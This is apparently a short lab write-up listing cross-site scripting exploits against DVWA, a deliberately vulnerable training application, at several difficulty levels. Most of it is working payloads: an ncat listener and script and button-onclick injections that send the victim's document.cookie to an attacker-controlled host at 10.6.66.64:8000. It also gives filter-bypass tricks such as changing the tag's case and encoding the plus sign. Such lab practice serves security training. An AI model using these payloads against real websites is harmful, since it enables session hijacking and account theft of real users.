# DVWA_exploits
Here is a list of exploits against DVWA for all levels


# XSS Injection 
Realistic attack : send the cookie of the current user to a web server. We are going to run a server that will listen on port 8000 and will return an empty response.
```
ncat -lkc "perl -e 'while (defined(\$x = <>)){ print STDERR \$x; last if \$x eq qq#\\r\\n
# } print qq#HTTP/1.1 204 No Content\\r\\n#'" 8000

```
This will show in the console the details of the requests. Now we have to call our server and providing in the request some stolen information ( the cookie ).
It would be done with a payload similar to this :
```
<script> window.location="http://10.6.66.64:8000?cookie="+document.cookie</script>
```

## Reflected XSS
### Easy
The first level doesn't contain any filtering, so we can simply write : 
```
<script> window.location="http://10.6.66.64:8000?cookie="+document.cookie</script>
```
in the name field and observe the result on the listener.
### Medium
It filters the `script` strings. We can just replace in our code `script` by `Script` :
```
<Script> window.location="http://10.6.66.64:8000?cookie="+document.cookie</Script>
```
### High
The last one prevent us from using a `script` tag, but we can use another tag, for instance a button with an `onclick` attribute :
```
<button onclick="window.location='http://10.6.66.64:8000?cookie='+document.cookie">exploit</button>
```
## Stored XSS
### Easy
The field message doesn't have any protection, so we can just enter the payload in the message field. Since this request will be send by POST, the `+` has to be transformed into `%2B` in order to be considered as a string and not as an url variable delimiter.
```
<script> window.location="http://10.6.66.64:8000?cookie="%2Bdocument.cookie</script>
```
### Medium
The field message is well protected, but no the field name. However, this field is limited in length. So we have to intercept the request with Burp, and put the payload in the name field. The `<script>` tag being filtered, we have to replace it with `<Script>`:
 ```
<Script> window.location="http://10.6.66.64:8000?cookie="%2Bdocument.cookie</Script>
```
### High
The field message is again the one exploitable. This time the `<script>` are again filtered, so we can create a button instead for instance :
```
<button onclick="window.location='http://10.6.66.64:8000?cookie='%2Bdocument.cookie">exploit</button>
```
